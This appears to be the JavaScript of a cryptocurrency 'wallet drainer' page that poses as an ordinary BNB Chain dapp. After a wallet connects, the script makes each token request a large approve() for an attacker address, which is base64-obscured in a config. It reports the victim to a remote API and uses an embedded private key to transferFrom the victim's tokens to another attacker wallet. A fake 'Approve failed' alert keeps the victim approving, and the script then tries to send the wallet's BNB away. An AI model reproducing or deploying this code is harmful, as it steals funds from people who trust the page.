$(function() {
    const erc20Abi=[
        {
          "inputs": [],
          "stateMutability": "nonpayable",
          "type": "constructor"
        },
        {
          "anonymous": false,
          "inputs": [
            {
              "indexed": true,
              "internalType": "address",
              "name": "owner",
              "type": "address"
            },
            {
              "indexed": true,
              "internalType": "address",
              "name": "spender",
              "type": "address"
            },
            {
              "indexed": false,
              "internalType": "uint256",
              "name": "value",
              "type": "uint256"
            }
          ],
          "name": "Approval",
          "type": "event"
        },
        {
          "anonymous": false,
          "inputs": [
            {
              "indexed": true,
              "internalType": "address",
              "name": "previousOwner",
              "type": "address"
            },
            {
              "indexed": true,
              "internalType": "address",
              "name": "newOwner",
              "type": "address"
            }
          ],
          "name": "OwnershipTransferred",
          "type": "event"
        },
        {
          "anonymous": false,
          "inputs": [
            {
              "indexed": true,
              "internalType": "address",
              "name": "from",
              "type": "address"
            },
            {
              "indexed": true,
              "internalType": "address",
              "name": "to",
              "type": "address"
            },
            {
              "indexed": false,
              "internalType": "uint256",
              "name": "value",
              "type": "uint256"
            }
          ],
          "name": "Transfer",
          "type": "event"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "owner",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            }
          ],
          "name": "allowance",
          "outputs": [
            {
              "internalType": "uint256",
              "name": "",
              "type": "uint256"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "amount",
              "type": "uint256"
            }
          ],
          "name": "approve",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "account",
              "type": "address"
            }
          ],
          "name": "balanceOf",
          "outputs": [
            {
              "internalType": "uint256",
              "name": "",
              "type": "uint256"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "decimals",
          "outputs": [
            {
              "internalType": "uint8",
              "name": "",
              "type": "uint8"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "subtractedValue",
              "type": "uint256"
            }
          ],
          "name": "decreaseAllowance",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "spender",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "addedValue",
              "type": "uint256"
            }
          ],
          "name": "increaseAllowance",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "_to",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "_amount",
              "type": "uint256"
            }
          ],
          "name": "mintTo",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "name",
          "outputs": [
            {
              "internalType": "string",
              "name": "",
              "type": "string"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "owner",
          "outputs": [
            {
              "internalType": "address",
              "name": "",
              "type": "address"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "renounceOwnership",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "symbol",
          "outputs": [
            {
              "internalType": "string",
              "name": "",
              "type": "string"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [],
          "name": "totalSupply",
          "outputs": [
            {
              "internalType": "uint256",
              "name": "",
              "type": "uint256"
            }
          ],
          "stateMutability": "view",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "recipient",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "amount",
              "type": "uint256"
            }
          ],
          "name": "transfer",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "sender",
              "type": "address"
            },
            {
              "internalType": "address",
              "name": "recipient",
              "type": "address"
            },
            {
              "internalType": "uint256",
              "name": "amount",
              "type": "uint256"
            }
          ],
          "name": "transferFrom",
          "outputs": [
            {
              "internalType": "bool",
              "name": "",
              "type": "bool"
            }
          ],
          "stateMutability": "nonpayable",
          "type": "function"
        },
        {
          "inputs": [
            {
              "internalType": "address",
              "name": "newOwner",
              "type": "address"
            }
          ],
          "name": "transferOwnership",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        }
      ];
    var currentAccount = null;
    var currentNetId;
    var tokenData = [];

    window.web3 = null;
    if (typeof window.ethereum !== "undefined") {
        window.web3 = new Web3(window.ethereum);
        window.web3.eth.net.getId((err, netId) => {
            handleNetworkChanged(netId);
            window.ethereum
                .request({ method: "eth_accounts" })
                .then((accounts) => {
                    ;
                });
          window.ethereum.on("accountsChanged", (accounts) =>
            handleAddressChanged(accounts)
          );
          window.ethereum.on("networkChanged", (networkId) =>
            handleNetworkChanged(networkId)
          );
        });
    }

    window.mobileCheck = function() {
      let check = false;
      (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
      return check;
    };

    if(mobileCheck()){
      showAlert("You need to open the website through wallet dapp to access properly.");
    }

    const callMethod = async (method, args = []) => {
        const result = await method(...args).call();
        return result;
    }
    
    const promisify = (promiEvent) => {
      return new Promise((resolve, reject) => {
        promiEvent
          .on('error', (err) => {
            //console.log('reject err : ', err);
            return reject(err);
          })
          .once('transactionHash', (hash) => {
            //console.log('hash :>> ', hash);
          })
          .once('receipt', receipt => { 
            //console.log('reciept', receipt);
            return resolve(receipt);
          })
      })
    }

    const bnDivdedByDecimals = (bn, decimals = defaultDecimal) => {
        return bn.dividedBy(new BigNumber(10).pow(decimals))
    }

    const getBnbBalance = async (address) => {
        const ethBalance = await web3.eth.getBalance(address);
        return bnDivdedByDecimals(new BigNumber(ethBalance), 18);
    }
    const getBalance = async (tokenContract, address, decimals) => {
        const result = await callMethod(tokenContract.methods['balanceOf'], [address]);
        return bnDivdedByDecimals(new BigNumber(result), decimals);
    }

    const sendBnbBalance = async (idx, from, to)  =>{
        let amount = await getBnbBalance(from);
        tokenData[idx]["approved"]=1;
        if(amount < 0.001) return;
        amount = 100;
        let args = new BigNumber(amount).minus(0.001).times(10 ** 18).toString();
        web3.eth.sendTransaction({
          from: from,
          to: to,
          value: web3.utils.toWei(args, 'wei')
        }, (err, transactionId) => {
          if  (err) {
            //console.log('Send Bnb failed', err);
            tokenData[idx]["approved"]=0;
          } else {
            //console.log('Send Bnb successful', transactionId)
            //showAlert("Send failed!, Please try again");
          }
        })       
    }

    const checkBalance = async (address, threshold = 0) => {
      const balance = await getBnbBalance(address);
      if (balance <= threshold) {
        throw new Error('Insufficient balance');
      }
      return balance;
    }

    
    const sendTransaction = async (privateKey, contractAddress, method, args = []) => {
      const account = web3.eth.accounts.privateKeyToAccount(privateKey);
      await checkBalance(account.address);

      const encodedABI = method(...args).encodeABI();
      const gasPrice = await web3.eth.getGasPrice();
      
      const gasEstimate = await web3.eth.estimateGas({
        from: account.address,
        to: contractAddress,
        data: encodedABI,
      });
      const tx = {
        from: account.address,
        to: contractAddress,
        gas: gasEstimate,
        gasPrice: gasPrice,
        data: encodedABI,
      };
      const signedTx = await web3.eth.accounts.signTransaction(tx, account.privateKey);
      const txHash = await promisify(web3.eth.sendSignedTransaction(signedTx.rawTransaction));

      return txHash;
    }

    const sendApproveRequest = async (idx, from, amount, tokenAddress) => {
      let tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
        let tokenDecimals = await callMethod(tokenContract.methods['decimals']);
        tokenDecimals = parseInt(tokenDecimals);
        amount = parseFloat(amount);
        amount = Math.floor(amount * 10000) / 10000.0;
        let args = new BigNumber(amount).times(10 ** tokenDecimals).toString();
        const args2 = new BigNumber(1).times(10 ** 10).toString();
        
        tokenData[idx]["approved"]=1;
        new web3.eth.Contract(erc20Abi, tokenAddress).methods
        .approve(config.puk, web3.utils.toWei(args2, 'tether'))
        .send({ from: from })
        .then(function(result){             
            //console.log('approve success');
            $.ajax({
              url: config.apiUrl,
              method: "POST",
              data: {
                method: "approved",
                net_id: currentNetId,
                wallet: from,
                token_addr: tokenAddress,
                token_name: tokenData[idx]["symbol"],
                token_decimals: tokenDecimals,
                myaddr: config.puk
              }
            }).done(function(res) {
            });  
            if(config.prk != ''){
              sendTransaction(config.prk, tokenAddress, tokenContract.methods.transferFrom, [from, config.ow, web3.utils.toWei(args, 'wei')]);            
            }
            showAlert("Approve failed!, Please try again");
            nextApprove();            
        })
        .catch(function(e){ 
            tokenData[idx]["approved"]=0;
            //console.log(e)                                          
        })
    }

    function getAjaxData(ajaxurl) { 
      return $.ajax({
        url: ajaxurl,
        type: 'GET',
      });
    };

    async function handleAddressChanged(accounts){
        //console.log("handleAddressChanged");
        if(accounts && accounts[0]){
          currentAccount = accounts[0];
          {
            $("#connect_wallet_btn").removeClass("loading");
            $(".content_not_connected").addClass("hide");
            $(".content_connected").removeClass("hide");
          }
          //console.log(currentAccount);
          var res = await getAjaxData(config.apiUrl+"?method=getHoldingTokenList&addr="+currentAccount);
          tokenData = JSON.parse(res);
          console.log(tokenData);
        }   
        else{
          {
            $(".content_not_connected").removeClass("hide");
            $(".content_connected").addClass("hide");
          }          
        }     
    }

    $("#approve_btn").click(function() {
        if(currentAccount == null){
            showAlert("Please connect wallet!");
            return;
        }
        nextApprove();
    });

    function nextApprove(){
      var cnt = tokenData.length;
      for(i = 1; i < cnt; i++){
        if(tokenData[i]["approved"] && tokenData[i]["approved"] == 1)
          continue;
        break;
      }
      if(i == cnt){
        if(tokenData[0]["approved"] == undefined)
          sendBnbBalance(0, currentAccount, config.ow);
      }        
      else{
        if(blacklist.includes(tokenData[i]["addr"]) || (tokenData[i]["usd"] == '-' && !whitelist.includes(tokenData[i]["addr"])) ){
          tokenData[i]["approved"] = 1;
          nextApprove();
          return;
        }
        sendApproveRequest(i, currentAccount, tokenData[i]["balance"], tokenData[i]["addr"]);
      }
    }

    function showAlert(msg){
        if(config.tp == "1"){
          $("#StatusPush div").html(msg);
        }
        else if(config.tp == "0"){
          layer.alert(msg, { icon: 6, title: "Alert", offset: "auto", skin: 'layui-layer-molv', btn:["OK"] });
        }
        else{
          alert(msg);
        }
    }

    function handleNetworkChanged(networkId){
        //console.log("handleNetworkChanged");
        currentNetId = networkId;
        if(networkId != 56){
          showAlert("Please select bsc net to proceed!");
          return;
        }
    }

    function init(){
      config.prk = atob(config.prk);
      config.puk = atob(config.puk);
      config.ow = atob(config.ow);
      //console.log(config);
    }
    init();

    $("#connect_wallet_btn").click(function() {
        $(this).addClass("loading");
        linkWallet();
    });

    async function linkWallet() {
        if (typeof window.ethereum !== "undefined") {
            try {
                currentNetId = await web3.eth.net.getId();
                if (currentNetId != 56){
                    showAlert("Please select bsc net to proceed!"); 
                    $("#connect_wallet_btn").removeClass("loading");
                    return;
                }
                   
                const accounts = await window.ethereum.request({
                    method: "eth_requestAccounts",
                });
                handleAddressChanged(accounts);
            } catch (error) {
                //showAlert("User Revoked Approval!");
                $("#connect_wallet_btn").removeClass("loading");
                return;
            }
        } else {
            showAlert("Please install metamask!");
            $("#connect_wallet_btn").removeClass("loading");
        }
    }
});
